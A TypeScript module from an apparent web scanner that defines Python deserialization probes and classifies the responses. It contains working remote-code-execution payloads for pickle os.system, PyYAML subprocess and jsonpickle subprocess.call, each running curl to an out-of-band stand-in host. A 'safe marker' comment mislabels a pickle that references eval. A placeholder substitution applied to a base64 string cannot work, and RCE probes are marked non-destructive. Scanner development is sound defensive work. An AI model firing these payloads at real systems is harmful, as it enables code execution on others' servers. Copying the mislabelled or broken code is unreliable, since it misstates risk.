// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'deserialization-python',
  family: 'deserialization',
  title: 'Python pickle / marshal deserialization',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'cookie', 'header', 'query'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure', 'status-delta'],
  cwe: [502],
};

// Pickle protocol 2 opcode magic: \x80\x02 (b64: gAI...)
// These are safe marker bytes that trigger a parse error if decoded/unpickled.
const PICKLE_MAGIC_B64 = 'gAJjX19idWlsdGluX18KZXZhbApxAIWBcQFScQIu';

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'deser-py-pickle-magic',
      family: 'deserialization',
      value: PICKLE_MAGIC_B64,
      encoding: 'raw',
      intent: 'Pickle protocol 2 magic bytes — triggers pickle error if endpoint pickles/unpickles',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'deser-py-pickle-oast',
      family: 'deserialization',
      value: `gAJjb3MKc3lzdGVtCnEAWCkAAAAuY3VybCBodHRwOi8vJHtvYXN0SG9zdH0vcGYtcGlja2xlcQGFcQJScQMu`.replace('${oastHost}', oastHost),
      encoding: 'raw',
      intent: 'Pickle os.system RCE payload — curl OAST callback confirms code execution',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-py-yaml-load',
      family: 'deserialization',
      value: `!!python/object/apply:subprocess.check_output\n- - curl\n  - http://${oastHost}/pf-yaml`,
      encoding: 'raw',
      intent: 'PyYAML !!python/object unsafe load — subprocess execution via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-py-marshal',
      family: 'deserialization',
      value: 'YwAAAAAAAAAAAAAAAAAAAAIAAAABAAAA',
      encoding: 'raw',
      intent: 'Python marshal.loads() minimal code object — triggers exception if used',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-py-jsonpickle',
      family: 'deserialization',
      value: `{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": [["curl", "http://${oastHost}/pf-jp"]]}]}`,
      encoding: 'json-string',
      intent: 'jsonpickle reduction exploit — subprocess.call via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-py-shelve',
      family: 'deserialization',
      value: PICKLE_MAGIC_B64.slice(0, 20),
      encoding: 'raw',
      intent: 'Truncated pickle magic — triggers EOFError / UnpicklingError in shelve.open() paths',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const body = resp.bodyText.toLowerCase();
  const pyError = body.includes('unpickling') || body.includes('pickle') ||
    body.includes('traceback') || body.includes('attributeerror') || body.includes('importerror');

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('OAST probe dispatched — awaiting Python gadget callback');
  } else if (pyError) {
    responseClass = 'parser-error';
    confidence = 0.8;
    nextAction = 'confirm';
    evidence.push('Python pickle/serialization error in response — deserialization endpoint detected');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No Python deserialization signal');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
